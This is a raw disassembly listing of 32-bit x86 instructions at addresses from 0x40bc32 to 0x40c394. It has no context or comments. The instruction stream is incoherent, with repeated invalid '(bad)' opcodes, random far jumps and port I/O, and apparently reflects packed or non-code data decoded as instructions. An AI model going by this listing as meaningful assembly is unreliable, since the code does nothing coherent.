  40bc32:	mov    DWORD PTR [esi-0x3d],eax
  40bc35:	mov    esp,0x91d53f9
  40bc3a:	cmp    al,BYTE PTR [ecx+0x60385017]
  40bc40:	jne    0x40bc9e
  40bc42:	add    al,BYTE PTR [ebp+0x3e7f978c]
  40bc48:	xlat   BYTE PTR ds:[ebx]
  40bc49:	(bad)  
  40bc4a:	mov    bl,BYTE PTR [edx]
  40bc4c:	or     DWORD PTR [edx],0xffffffd8
  40bc4f:	ja     0x40bc66
  40bc51:	add    cl,ch
  40bc53:	mov    eax,0xd0328d73
  40bc58:	enter  0x484c,0xb9
  40bc5c:	out    dx,eax
  40bc5d:	lea    edi,[edi+0x66]
  40bc60:	and    eax,DWORD PTR [esi]
  40bc62:	(bad)  [edi+0x46]
  40bc65:	lea    edi,[edi]
  40bc67:	xor    DWORD PTR [edx-0x524e19e3],0x934b5093
  40bc71:	jl     0x40bc9b
  40bc73:	aam    0x76
  40bc75:	jb     0x40bbfc
  40bc77:	in     al,0xdf
  40bc79:	mov    WORD PTR [eax+eiz*1-0x3ad3f02d],ds
  40bc80:	inc    ebx
  40bc81:	sub    ebx,DWORD PTR [edi-0x3274a342]
  40bc87:	dec    eax
  40bc88:	xchg   edi,eax
  40bc89:	test   BYTE PTR [edi-0x34],0xba
  40bc8d:	aad    0x59
  40bc8f:	dec    esp
  40bc90:	pop    esp
  40bc91:	pop    esp
  40bc92:	xchg   ecx,eax
  40bc93:	nop
  40bc94:	push   ds
  40bc95:	dec    esp
  40bc96:	fidiv  DWORD PTR [ecx]
  40bc98:	pop    edi
  40bc99:	xor    eax,0x2ec74073
  40bc9e:	std    
  40bc9f:	dec    edi
  40bca0:	mov    ecx,0x3b8df8cc
  40bca5:	cmp    DWORD PTR [ebx],0x625077cb
  40bcab:	xchg   ebp,eax
  40bcac:	(bad)  
  40bcad:	and    ah,al
  40bcaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bcb0:	push   esp
  40bcb1:	sub    edi,DWORD PTR [esi-0x5d]
  40bcb4:	push   ss
  40bcb5:	cmp    al,0x2a
  40bcb7:	mov    ds:0x79f1c20,eax
  40bcbc:	mov    dh,0x68
  40bcbe:	mov    DWORD PTR [esi],esp
  40bcc0:	dec    edx
  40bcc1:	fcmovnbe st,st(5)
  40bcc3:	scas   al,BYTE PTR es:[edi]
  40bcc4:	and    BYTE PTR [ecx],dh
  40bcc6:	shl    al,1
  40bcc8:	in     al,dx
  40bcc9:	push   ds
  40bcca:	cmp    esi,DWORD PTR [ecx]
  40bccc:	cmp    eax,0x6b9fb1ff
  40bcd1:	push   ebx
  40bcd2:	mov    bh,0xe4
  40bcd4:	js     0x40bcaa
  40bcd6:	fild   DWORD PTR [esi-0x5f]
  40bcd9:	scas   al,BYTE PTR es:[edi]
  40bcda:	or     BYTE PTR [ecx-0x72f80eb7],bl
  40bce0:	xor    BYTE PTR [esp+esi*4],dl
  40bce3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bce4:	xchg   ebp,eax
  40bce5:	pop    ds
  40bce6:	cdq    
  40bce7:	pop    ebp
  40bce8:	imul   edx,DWORD PTR [edx-0xd],0x48d79e8b
  40bcef:	inc    esp
  40bcf0:	push   0xfffffffa
  40bcf2:	or     esp,eax
  40bcf4:	push   0x4f159f9a
  40bcf9:	std    
  40bcfa:	sub    BYTE PTR [eax],al
  40bcfc:	jmp    0x40bd23
  40bcfe:	into   
  40bcff:	into   
  40bd00:	(bad)  [esi+0x16]
  40bd03:	sbb    dl,BYTE PTR [eiz*2-0x177d8ca6]
  40bd0a:	jnp    0x40bd36
  40bd0c:	sbb    edi,DWORD PTR [eax+ecx*4+0x789e843b]
  40bd13:	adc    eax,0x602eb2ea
  40bd18:	sub    DWORD PTR [ebp-0x32],0xfdc7ad51
  40bd1f:	adc    al,0x1
  40bd21:	xor    al,BYTE PTR [eax+0x231f4ca6]
  40bd27:	fadd   QWORD PTR [edx+ebx*8-0xdb80a2e]
  40bd2e:	xchg   edi,eax
  40bd30:	push   ecx
  40bd31:	and    BYTE PTR ds:0x1e5c,0xd5
  40bd37:	mov    cl,0x3
  40bd39:	ds enter 0x186c,0x2e
  40bd3e:	in     al,dx
  40bd3f:	sahf   
  40bd40:	scas   eax,DWORD PTR es:[edi]
  40bd41:	add    DWORD PTR [edi+ebp*4],edi
  40bd44:	inc    esi
  40bd45:	push   ebp
  40bd46:	fstp   TBYTE PTR [edi*1-0x75ed52eb]
  40bd4d:	les    esp,FWORD PTR [esi-0x2945601]
  40bd53:	fisubr WORD PTR [ebp+0x7]
  40bd56:	jnp    0x40bd7c
  40bd58:	shl    BYTE PTR [ecx+eax*2-0x8b6996],cl
  40bd5f:	mov    eax,fs
  40bd61:	xor    dh,ch
  40bd63:	(bad)  
  40bd64:	out    0xb8,eax
  40bd66:	add    BYTE PTR [edx+0x60596491],0x4a
  40bd6d:	push   0xffffffcf
  40bd6f:	and    DWORD PTR [ecx-0x45534c61],0x9f48fde8
  40bd79:	add    BYTE PTR [esi],ch
  40bd7b:	adc    BYTE PTR [edx+eiz*2+0x172cb4db],bh
  40bd82:	inc    ebp
  40bd83:	xor    DWORD PTR [ebx+0x30],ebp
  40bd86:	and    edi,DWORD PTR [eax]
  40bd88:	int    0x61
  40bd8a:	inc    ecx
  40bd8b:	outs   dx,BYTE PTR ds:[esi]
  40bd8c:	ss retf 
  40bd8e:	outs   dx,DWORD PTR ds:[esi]
  40bd8f:	and    al,0x8c
  40bd91:	stos   DWORD PTR es:[edi],eax
  40bd92:	xor    BYTE PTR [edx-0x7b31fcb3],dh
  40bd98:	nop
  40bd99:	inc    esi
  40bd9a:	stc    
  40bd9b:	mov    al,ds:0x8d92adcd
  40bda0:	pop    edi
  40bda1:	imul   ebx,DWORD PTR [edx-0x5dce5b48],0xf9dbe774
  40bdab:	(bad)  
  40bdac:	in     eax,0x45
  40bdae:	popf   
  40bdaf:	inc    ecx
  40bdb0:	xchg   edx,eax
  40bdb1:	mov    edi,0xcc72f547
  40bdb6:	pop    esi
  40bdb7:	repnz adc esp,ecx
  40bdba:	fisubr DWORD PTR [ebx-0x78]
  40bdbd:	xchg   edi,eax
  40bdbe:	stc    
  40bdbf:	test   al,0x20
  40bdc1:	fstp   TBYTE PTR [ebx+edi*2]
  40bdc4:	ret    0x5e7d
  40bdc7:	jbe    0x40bda9
  40bdc9:	int    0x4
  40bdcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bdcc:	jns    0x40be09
  40bdce:	add    eax,0x8ffb8b8a
  40bdd3:	or     DWORD PTR [esp+eax*1+0x1ae072af],esi
  40bdda:	in     eax,0xbb
  40bddc:	call   0xd4aa:0x7e24f539
  40bde3:	ds xchg ecx,eax
  40bde5:	ss sub al,0xb2
  40bde8:	lods   eax,DWORD PTR ds:[esi]
  40bde9:	test   DWORD PTR [ecx+ebp*2-0x67d5a5e5],ebx
  40bdf0:	adc    eax,0x85c4ee38
  40bdf5:	enter  0xa666,0xaa
  40bdf9:	cmp    BYTE PTR [eax+0x5],bl
  40bdfc:	jnp    0x40bdfd
  40bdfe:	jmp    0xbdbac864
  40be03:	jns    0x40be67
  40be05:	mov    dh,0xbc
  40be07:	ss aas 
  40be09:	test   DWORD PTR [edi],0xcb7ae45e
  40be0f:	ret    
  40be10:	pop    edi
  40be11:	(bad)  
  40be12:	leave  
  40be13:	or     al,0x81
  40be15:	mov    ebp,DWORD PTR [esi+0x19a5a6ea]
  40be1b:	mov    bh,0x9a
  40be1d:	xchg   esp,eax
  40be1e:	xor    BYTE PTR [ebx],0xa1
  40be21:	(bad)  
  40be22:	sbb    dh,BYTE PTR [ebp-0x2b1221ba]
  40be28:	hlt    
  40be29:	enter  0x895,0xee
  40be2d:	mov    eax,ds:0xd825dc8c
  40be32:	add    ebx,DWORD PTR [ebp+0x69]
  40be35:	xchg   bh,cl
  40be37:	ins    DWORD PTR es:[edi],dx
  40be38:	fnstsw WORD PTR [ecx]
  40be3a:	jle    0x40be4d
  40be3c:	clc    
  40be3d:	jl     0x40be8d
  40be3f:	les    ebx,FWORD PTR [esi]
  40be41:	jo     0x40be7b
  40be43:	pushf  
  40be44:	jmp    0x40be99
  40be46:	jae    0x40be86
  40be48:	xor    esp,esi
  40be4a:	cmp    BYTE PTR [eax],dl
  40be4c:	push   ebx
  40be4d:	xor    ebx,edi
  40be4f:	les    ebp,FWORD PTR [edx+ecx*1-0x8]
  40be53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be54:	es repnz push ebp
  40be57:	xlat   BYTE PTR ds:[ebx]
  40be59:	(bad)  
  40be5a:	lds    esi,FWORD PTR [ecx+0x2d02fbc6]
  40be60:	dec    esp
  40be61:	aas    
  40be62:	push   0x661c754a
  40be67:	jle    0x40be92
  40be69:	jge    0x40bdf5
  40be6b:	push   ss
  40be6c:	ja     0x40be21
  40be6e:	div    DWORD PTR [edi]
  40be70:	add    BYTE PTR [edx-0x77],bl
  40be73:	(bad)  
  40be74:	retf   0x64a2
  40be77:	imul   ebp,DWORD PTR [ebp+0x44],0x5bc43535
  40be7e:	mov    ch,BYTE PTR [edx+0x36464bd1]
  40be84:	outs   dx,BYTE PTR ds:[esi]
  40be85:	jl     0x40be65
  40be87:	ja     0x40bea0
  40be89:	jne    0x40be76
  40be8b:	xor    eax,0xb88fc773
  40be90:	xor    al,0xea
  40be92:	jmp    0x189b:0x29ca304d
  40be99:	jae    0x40bef5
  40be9b:	mov    edx,0x9d54da19
  40bea0:	aas    
  40bea1:	ja     0x40be55
  40bea3:	sub    esp,DWORD PTR [ebx-0x7230f0f7]
  40bea9:	pop    edx
  40beaa:	ficomp DWORD PTR [edi-0x3514c8fb]
  40beb0:	push   eax
  40beb1:	lahf   
  40beb2:	shr    bl,cl
  40beb4:	dec    esi
  40beb5:	mov    bh,BYTE PTR [esi]
  40beb7:	(bad)  
  40beb8:	ins    DWORD PTR es:[edi],dx
  40beb9:	mov    ds:0xa7a5be79,al
  40bebe:	fdiv   st(7),st
  40bec0:	fcom   DWORD PTR [esi+0x24]
  40bec3:	aas    
  40bec4:	ret    
  40bec5:	add    eax,0xb5abb4ca
  40beca:	xor    DWORD PTR [ecx],eax
  40becc:	pop    eax
  40becd:	imul   DWORD PTR [edx+0x3b]
  40bed0:	lods   eax,DWORD PTR ds:[esi]
  40bed1:	bound  edx,QWORD PTR [edi+ecx*4-0x4b]
  40bed5:	inc    eax
  40bed6:	mov    gs,eax
  40bed8:	inc    esp
  40bed9:	pop    ebp
  40beda:	mov    eax,0x2145ecec
  40bedf:	mov    esp,0xbb2dde08
  40bee4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bee5:	gs push ds
  40bee7:	cld    
  40bee8:	mov    ds:0x27623493,al
  40beed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40beee:	xor    edx,DWORD PTR [ebp-0x232873b4]
  40bef4:	xchg   edx,eax
  40bef5:	xor    ecx,DWORD PTR [esi]
  40bef7:	inc    eax
  40bef8:	jg     0x40beff
  40befa:	sbb    cl,BYTE PTR [eax+0x2b]
  40befd:	in     eax,dx
  40befe:	shl    dh,0x21
  40bf01:	mov    cl,0x3a
  40bf03:	dec    eax
  40bf04:	xchg   esi,eax
  40bf05:	das    
  40bf06:	push   ecx
  40bf07:	pop    es
  40bf08:	dec    esp
  40bf09:	pop    gs
  40bf0b:	xchg   BYTE PTR [ebx+0x75e58533],cl
  40bf11:	mov    ebp,0xbbfeb1ce
  40bf16:	dec    eax
  40bf17:	xor    esi,DWORD PTR [esp+ebx*1+0x19]
  40bf1b:	push   cs
  40bf1c:	mov    esp,0x5c1b468d
  40bf21:	or     ch,dl
  40bf23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf24:	repz cdq 
  40bf26:	pusha  
  40bf27:	mov    bh,0xd4
  40bf29:	xchg   BYTE PTR [ebx],ch
  40bf2b:	test   BYTE PTR [ebp-0x31],cl
  40bf2e:	es scas eax,DWORD PTR es:[edi]
  40bf30:	call   0x21e442be
  40bf35:	ret    
  40bf36:	pop    edi
  40bf37:	jecxz  0x40bf7b
  40bf39:	inc    esi
  40bf3a:	retf   
  40bf3b:	jmp    0x78c6:0x7a7780eb
  40bf42:	inc    edx
  40bf43:	sub    DWORD PTR [esi-0x58],ecx
  40bf46:	call   DWORD PTR [edi-0x38e5da0a]
  40bf4c:	loop   0x40bfa1
  40bf4e:	jg     0x40bf91
  40bf50:	push   ss
  40bf51:	pusha  
  40bf52:	repnz mov dl,0x7
  40bf55:	cmp    cl,ch
  40bf57:	mov    bl,0xba
  40bf59:	ds repnz mov edi,0xe99625c8
  40bf60:	sub    al,BYTE PTR [esi+0x25]
  40bf63:	ds inc eax
  40bf65:	sub    ebx,DWORD PTR [ebx+edx*2-0x5e64f8db]
  40bf6c:	test   DWORD PTR [eax],eax
  40bf6e:	adc    eax,0x446337c7
  40bf73:	pop    edx
  40bf74:	pop    es
  40bf75:	stos   BYTE PTR es:[edi],al
  40bf76:	sbb    DWORD PTR [eax],esp
  40bf78:	push   cs
  40bf79:	cmp    dl,bl
  40bf7b:	imul   esp,DWORD PTR [eax+esi*1-0x1c],0x7ec4b3fe
  40bf83:	rcl    DWORD PTR [edx+0x18e2c834],0x95
  40bf8a:	xor    BYTE PTR [esp+ecx*1-0x7e8002d],dh
  40bf91:	popa   
  40bf92:	call   0x3ee8628b
  40bf97:	dec    ebp
  40bf98:	xchg   esp,eax
  40bf99:	mov    BYTE PTR [ecx+0x3bace6cf],0xb5
  40bfa0:	pop    es
  40bfa1:	xchg   edi,eax
  40bfa2:	lea    esp,[eax-0x2f]
  40bfa5:	test   BYTE PTR [eax+eiz*1-0x16],al
  40bfa9:	xor    eax,0x9baf2d6f
  40bfae:	push   ds
  40bfaf:	xchg   ecx,eax
  40bfb0:	xor    edi,esi
  40bfb2:	xor    eax,0xbf9cec5
  40bfb7:	clc    
  40bfb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfb9:	enter  0x2620,0x32
  40bfbd:	lea    esp,[ebx]
  40bfbf:	xchg   ebp,eax
  40bfc0:	dec    eax
  40bfc1:	push   ebp
  40bfc2:	shl    ch,1
  40bfc4:	aam    0x21
  40bfc6:	jne    0x40c042
  40bfc8:	outs   dx,BYTE PTR ds:[esi]
  40bfc9:	jnp    0x40bf7f
  40bfcb:	call   0x530:0xc437b8b3
  40bfd2:	mov    ds:0x67500318,eax
  40bfd7:	lahf   
  40bfd8:	push   ds
  40bfd9:	jmp    DWORD PTR [eax-0x4633b0cd]
  40bfdf:	cli    
  40bfe0:	call   0x6c21:0xf6c86eba
  40bfe7:	idiv   ch
  40bfe9:	add    DWORD PTR [edi+0xb],edi
  40bfec:	sbb    BYTE PTR [ebx-0x76],cl
  40bfef:	(bad)  
  40bff0:	jp     0x40bfb0
  40bff2:	cld    
  40bff3:	sbb    al,0xf6
  40bff5:	pop    ebp
  40bff6:	mov    bl,0x8a
  40bff8:	in     al,0x47
  40bffa:	add    ch,cl
  40bffc:	dec    edx
  40bffd:	dec    edi
  40bffe:	aam    0x6a
  40c000:	scas   eax,DWORD PTR es:[edi]
  40c001:	pop    esi
  40c002:	push   esp
  40c003:	sbb    eax,0x69345d99
  40c008:	div    DWORD PTR [eax+0x6668fe50]
  40c00e:	or     eax,0xaa3da071
  40c013:	ss xchg ecx,edi
  40c016:	mov    eax,ds:0xce078e69
  40c01b:	subps  xmm0,xmm5
  40c01e:	dec    ebx
  40c01f:	pop    ds
  40c020:	fadd   st,st(5)
  40c022:	std    
  40c023:	scas   al,BYTE PTR es:[edi]
  40c024:	jle    0x40bfb7
  40c026:	div    DWORD PTR [eax-0x80]
  40c029:	stos   BYTE PTR es:[edi],al
  40c02a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c02b:	inc    esp
  40c02c:	mov    edi,0x3beb82f
  40c031:	adc    al,0xab
  40c033:	ins    DWORD PTR es:[edi],dx
  40c034:	outs   dx,DWORD PTR ds:[esi]
  40c035:	jnp    0x40c0af
  40c037:	das    
  40c038:	int    0xbf
  40c03a:	xor    BYTE PTR [ecx],al
  40c03c:	and    DWORD PTR [eax-0xa9921ba],ebp
  40c042:	jns    0x40c066
  40c044:	ins    DWORD PTR es:[edi],dx
  40c045:	pop    ds
  40c046:	shl    DWORD PTR [ebx-0x7a38ba16],1
  40c04c:	mov    ecx,DWORD PTR [esi]
  40c04e:	dec    edx
  40c04f:	sub    al,BYTE PTR [edx+0x35]
  40c052:	xor    esi,edi
  40c054:	push   0x19
  40c056:	cmp    al,0xa3
  40c058:	in     al,dx
  40c059:	jmp    0x237c5fc4
  40c05e:	sbb    DWORD PTR [edx+0x1ef7a418],0xffffffe1
  40c065:	bnd jae 0x40c0d6
  40c068:	aad    0x24
  40c06a:	mov    ebx,0x7de924c0
  40c06f:	xlat   BYTE PTR ds:[ebx]
  40c070:	scas   eax,DWORD PTR es:[edi]
  40c071:	in     eax,0x3d
  40c073:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c074:	sub    DWORD PTR [edi-0x5f2a0ab0],ebp
  40c07a:	mov    ecx,0x6bf84adc
  40c07f:	and    eax,0x646a0df9
  40c084:	aam    0xad
  40c086:	lods   eax,DWORD PTR ds:[esi]
  40c087:	mov    dh,0xb0
  40c089:	xchg   edx,eax
  40c08a:	push   edx
  40c08b:	push   ss
  40c08c:	adc    al,0xc1
  40c08e:	pmovmskb esi,mm0
  40c091:	mov    ecx,0xa3746bc6
  40c096:	add    BYTE PTR cs:[edx-0x76],al
  40c09a:	pop    es
  40c09b:	jl     0x40c09d
  40c09d:	xor    al,0x53
  40c09f:	pop    es
  40c0a0:	push   ss
  40c0a1:	xchg   ecx,eax
  40c0a2:	pusha  
  40c0a3:	dec    esi
  40c0a4:	gs cmp al,0xb3
  40c0a7:	push   ebp
  40c0a8:	mov    ds:0x6283e9e,al
  40c0ad:	aad    0x52
  40c0af:	jge    0x40c09d
  40c0b1:	jge    0x40c0ef
  40c0b3:	lahf   
  40c0b4:	out    dx,eax
  40c0b5:	arpl   WORD PTR [eax-0x4b],si
  40c0b8:	imul   edx,DWORD PTR [esi],0xa9f7be69
  40c0be:	pop    ebx
  40c0bf:	mul    DWORD PTR [edx]
  40c0c1:	add    eax,0xa338c5e9
  40c0c6:	jnp    0x40c137
  40c0c8:	and    ebp,DWORD PTR [esi-0x62196135]
  40c0ce:	sahf   
  40c0cf:	cdq    
  40c0d0:	loope  0x40c0f6
  40c0d2:	xor    eax,0xe557ab19
  40c0d7:	add    eax,0xdf276afc
  40c0dc:	pop    ebx
  40c0dd:	(bad)  
  40c0de:	sti    
  40c0df:	push   0xed595e62
  40c0e4:	fcomi  st,st(2)
  40c0e6:	sahf   
  40c0e7:	retf   0x29a1
  40c0ea:	pop    esp
  40c0eb:	pushf  
  40c0ec:	mov    esi,0x81072b2e
  40c0f1:	ret    
  40c0f2:	ret    
  40c0f3:	aaa    
  40c0f4:	jl     0x40c16c
  40c0f6:	dec    edi
  40c0f7:	or     DWORD PTR [ebx-0x71c406a5],0xffffffa6
  40c0fe:	(bad)  
  40c0ff:	nop
  40c100:	dec    esi
  40c101:	jmp    0xbab5:0x754cf82f
  40c108:	cmp    ch,BYTE PTR [ebp+0x48fdda25]
  40c10e:	mov    BYTE PTR ss:[ecx+0x2666f363],bl
  40c115:	jo     0x40c0df
  40c117:	or     al,0xe1
  40c119:	shl    DWORD PTR [ecx-0x3b],1
  40c11c:	push   ebp
  40c11d:	inc    edi
  40c11e:	jmp    0xcd30:0x4310417e
  40c125:	push   edx
  40c126:	loop   0x40c0f6
  40c128:	fwait
  40c129:	add    BYTE PTR [edi],dh
  40c12b:	adc    DWORD PTR [esi+edi*2+0x63ab0a84],eax
  40c132:	cs ss dec ebp
  40c135:	cmp    al,0x8d
  40c137:	xchg   ecx,eax
  40c138:	or     BYTE PTR ds:0xaf7c71ab,ch
  40c13e:	scas   al,BYTE PTR es:[edi]
  40c13f:	mov    bh,BYTE PTR [edi+ecx*4+0x62fd07ce]
  40c146:	xchg   edx,eax
  40c147:	mov    edi,0x3e76f225
  40c14c:	mul    DWORD PTR [eax+0x255e8ebc]
  40c152:	pop    edi
  40c153:	fmulp  st(3),st
  40c155:	push   eax
  40c156:	sub    al,BYTE PTR [ebx+0x3bf05053]
  40c15c:	mov    edx,DWORD PTR [edi]
  40c15e:	nop
  40c15f:	(bad)  
  40c160:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c161:	es pop ebx
  40c163:	sbb    DWORD PTR [eax-0xc3f20cf],esp
  40c169:	loopne 0x40c12e
  40c16b:	inc    edx
  40c16c:	jg     0x40c113
  40c16e:	push   esp
  40c16f:	push   ebp
  40c170:	xchg   edi,eax
  40c171:	mov    ah,0x59
  40c173:	sub    ah,ah
  40c175:	mov    edx,DWORD PTR [ebx-0x7a335d5e]
  40c17b:	or     al,0x27
  40c17d:	xlat   BYTE PTR ds:[ebx]
  40c17e:	test   eax,0x9eaa7cd8
  40c183:	dec    esi
  40c184:	mov    bl,0xb6
  40c186:	rcl    BYTE PTR [esi],1
  40c188:	(bad)  
  40c189:	clc    
  40c18a:	loopne 0x40c1fb
  40c18c:	rcl    BYTE PTR [ecx+0x54],0x50
  40c190:	jge    0x40c1a6
  40c192:	or     eax,0xaef138cc
  40c197:	add    al,0x6
  40c199:	push   edi
  40c19a:	push   esp
  40c19b:	loopne 0x40c1f4
  40c19d:	hlt    
  40c19e:	mov    edx,cs
  40c1a0:	adc    edx,DWORD PTR [ebx]
  40c1a2:	sar    ebp,1
  40c1a4:	into   
  40c1a5:	pop    esp
  40c1a6:	xchg   BYTE PTR ds:0xbbe19391,dh
  40c1ac:	in     al,0x18
  40c1ae:	lods   al,BYTE PTR ds:[esi]
  40c1af:	jbe    0x40c1bc
  40c1b1:	repnz out dx,eax
  40c1b3:	push   0xffffffe3
  40c1b5:	sbb    BYTE PTR [ebx-0x18],bh
  40c1b8:	pop    esi
  40c1b9:	test   DWORD PTR [ecx+eax*1+0x77],ecx
  40c1bd:	pop    ebp
  40c1be:	add    bl,dl
  40c1c0:	fdivp  st(2),st
  40c1c2:	aam    0x81
  40c1c4:	cmp    al,0xbe
  40c1c6:	mov    ah,dh
  40c1c8:	neg    DWORD PTR [ebx]
  40c1ca:	and    DWORD PTR [edi],0xffffffa6
  40c1cd:	cwde   
  40c1ce:	xchg   ebp,eax
  40c1cf:	cmp    eax,0xb757cb99
  40c1d4:	jmp    0x40c242
  40c1d6:	(bad)  
  40c1d7:	aas    
  40c1d8:	jmp    0x8ec2:0x733e7d06
  40c1df:	mov    ebp,0xde4ebffd
  40c1e4:	adc    al,0xe2
  40c1e6:	shr    BYTE PTR ss:[esi],1
  40c1e9:	ficom  DWORD PTR [ebp-0x67fb2a46]
  40c1ef:	cmp    DWORD PTR [edx],0x6e
  40c1f2:	outs   dx,DWORD PTR ds:[esi]
  40c1f3:	fmul   st,st(0)
  40c1f5:	fwait
  40c1f6:	je     0x40c207
  40c1f8:	xchg   edi,eax
  40c1f9:	push   ebp
  40c1fa:	dec    esi
  40c1fb:	jo     0x40c27b
  40c1fd:	xor    bl,BYTE PTR [edi]
  40c1ff:	add    dh,ah
  40c201:	sbb    BYTE PTR [edx+0x0],bl
  40c204:	push   ss
  40c205:	bound  eax,QWORD PTR [ebp+0x3d5faab8]
  40c20b:	pop    ebx
  40c20c:	out    0xe2,eax
  40c20e:	daa    
  40c20f:	xchg   ebp,eax
  40c210:	test   BYTE PTR [ecx+esi*2-0x49],0xeb
  40c215:	adc    BYTE PTR [eax+0x53f68a49],0xa8
  40c21c:	lahf   
  40c21d:	stos   BYTE PTR es:[edi],al
  40c21e:	lar    ebx,WORD PTR [ecx-0x3a]
  40c222:	cwde   
  40c223:	lods   eax,DWORD PTR ds:[esi]
  40c224:	xor    eax,esp
  40c226:	jmp    0xf5b7:0x78172c3b
  40c22d:	fmulp  st(3),st
  40c22f:	std    
  40c230:	mov    al,ds:0x4fb8a1ac
  40c235:	mov    dh,0x1a
  40c237:	mov    eax,ds:0x45bc3d62
  40c23c:	jno    0x40c200
  40c23e:	xchg   ecx,eax
  40c23f:	std    
  40c240:	mov    esp,DWORD PTR [eax]
  40c242:	mov    al,ds:0x47cae85f
  40c247:	scas   al,BYTE PTR es:[edi]
  40c248:	push   esp
  40c249:	adc    bl,al
  40c24b:	enter  0xe8c2,0x7
  40c24f:	loope  0x40c2c7
  40c251:	add    al,0x65
  40c253:	or     esi,DWORD PTR [edi]
  40c255:	push   ebp
  40c256:	js     0x40c29f
  40c258:	ja     0x40c23b
  40c25a:	inc    edx
  40c25b:	jo     0x40c21c
  40c25d:	mov    ecx,0x42ee93ec
  40c262:	test   BYTE PTR [edi+ebx*4],bl
  40c265:	scas   al,BYTE PTR es:[edi]
  40c266:	mov    edx,DWORD PTR [esi-0x21b73d7d]
  40c26c:	jne    0x40c216
  40c26e:	add    esi,DWORD PTR [edi+0x6c]
  40c271:	push   esi
  40c272:	jl     0x40c241
  40c274:	or     al,0xc8
  40c276:	cmp    edi,DWORD PTR [eax+eax*1-0x7eb6ab5d]
  40c27d:	fisttp DWORD PTR [ecx]
  40c27f:	sub    al,0xf0
  40c281:	test   al,0xdc
  40c283:	add    eax,0x69ace76d
  40c289:	push   eax
  40c28a:	enter  0x2cf5,0x5
  40c28e:	pop    edx
  40c28f:	jb     0x40c2a8
  40c291:	and    eax,0xaba99c12
  40c296:	and    DWORD PTR [esi+0x43404d72],ecx
  40c29c:	dec    eax
  40c29d:	mov    al,0x67
  40c29f:	fldenv [edx-0x677dc87c]
  40c2a5:	js     0x40c2f3
  40c2a7:	dec    esp
  40c2a8:	in     eax,0xfa
  40c2aa:	repnz dec edx
  40c2ac:	jnp    0x40c27f
  40c2ae:	(bad)  
  40c2af:	fadd   DWORD PTR [esi+ebp*2]
  40c2b2:	int3   
  40c2b3:	or     ecx,edi
  40c2b5:	enter  0x2d9e,0xa
  40c2b9:	and    eax,0xca10766f
  40c2be:	push   cs
  40c2bf:	xchg   ebp,eax
  40c2c0:	add    eax,esp
  40c2c2:	cmc    
  40c2c3:	fwait
  40c2c4:	push   ebp
  40c2c5:	and    eax,0x31e3d63e
  40c2ca:	clc    
  40c2cb:	cmp    BYTE PTR [esi],bl
  40c2cd:	call   0xfeb7:0x835478af
  40c2d4:	pop    edi
  40c2d5:	fwait
  40c2d6:	aas    
  40c2d7:	popf   
  40c2d8:	sti    
  40c2d9:	add    DWORD PTR [ecx],esp
  40c2db:	call   0xb80a:0xf914f702
  40c2e2:	jmp    0x40c35a
  40c2e4:	xchg   ebx,eax
  40c2e5:	fdivrp st(7),st
  40c2e7:	xlat   BYTE PTR ds:[ebx]
  40c2e8:	repnz sub BYTE PTR [eax-0x6ea925ec],dh
  40c2ef:	repz adc al,0x80
  40c2f2:	ss jb  0x40c308
  40c2f5:	iret   
  40c2f6:	in     al,0xb9
  40c2f8:	es push ss
  40c2fa:	ret    0xd251
  40c2fd:	rcr    DWORD PTR [edi-0x17a0bb1d],cl
  40c303:	into   
  40c304:	dec    edi
  40c305:	mov    dh,0xee
  40c307:	add    ah,bl
  40c309:	cmp    eax,0x3343eaf8
  40c30e:	push   ebx
  40c30f:	stos   DWORD PTR es:[edi],eax
  40c310:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  40c312:	or     eax,0x661e427e
  40c317:	scas   al,BYTE PTR es:[edi]
  40c318:	push   edx
  40c319:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c31a:	out    dx,eax
  40c31b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c31c:	outs   dx,BYTE PTR ds:[esi]
  40c31d:	pop    ebp
  40c31e:	ret    
  40c31f:	leave  
  40c320:	xor    edi,DWORD PTR [esi-0x52]
  40c323:	and    ecx,edi
  40c325:	inc    edx
  40c326:	out    dx,al
  40c327:	and    al,0xf5
  40c329:	das    
  40c32a:	jb     0x40c34b
  40c32c:	lock lods eax,DWORD PTR ds:[esi]
  40c32e:	add    DWORD PTR [esi+0x25],edx
  40c331:	mov    BYTE PTR [edi],dh
  40c333:	in     al,dx
  40c334:	jge    0x40c392
  40c336:	(bad)  
  40c337:	retf   0xa25e
  40c33a:	cld    
  40c33b:	lahf   
  40c33c:	jmp    0x40c2be
  40c33e:	mov    ah,0xfb
  40c340:	inc    esp
  40c341:	push   ecx
  40c342:	adc    eax,0xd0ac1c82
  40c347:	mov    ch,0x1
  40c349:	xor    bl,0x53
  40c34c:	rol    BYTE PTR [ebp-0x13b0b50a],cl
  40c352:	out    dx,eax
  40c353:	and    ch,0x9b
  40c356:	dec    esp
  40c357:	or     eax,0xc2169ba2
  40c35c:	inc    esp
  40c35d:	iret   
  40c35e:	inc    eax
  40c35f:	gs and ecx,ebx
  40c362:	fstp   TBYTE PTR [ecx+0x0]
  40c365:	and    al,0x2b
  40c367:	aam    0x2d
  40c369:	mov    al,0x9
  40c36b:	cmp    ah,BYTE PTR ds:0xecae2ae2
  40c371:	sbb    edx,DWORD PTR [esi-0x318fc5bc]
  40c377:	fiadd  WORD PTR [ebp+0x6f]
  40c37a:	push   esi
  40c37b:	sub    DWORD PTR [edi-0xd],0x283a62e9
  40c382:	fistp  QWORD PTR [eax+esi*2]
  40c385:	sub    al,0xa8
  40c387:	aas    
  40c388:	ret    
  40c389:	pop    es
  40c38a:	push   cs
  40c38b:	mov    bh,0xa0
  40c38d:	mov    ds:0xd442ad61,eax
  40c392:	xlat   BYTE PTR ds:[ebx]
  40c393:	xchg   edi,eax
  40c394:	test   DWORD PTR [eax+eax*4-0x3fe7944],edi
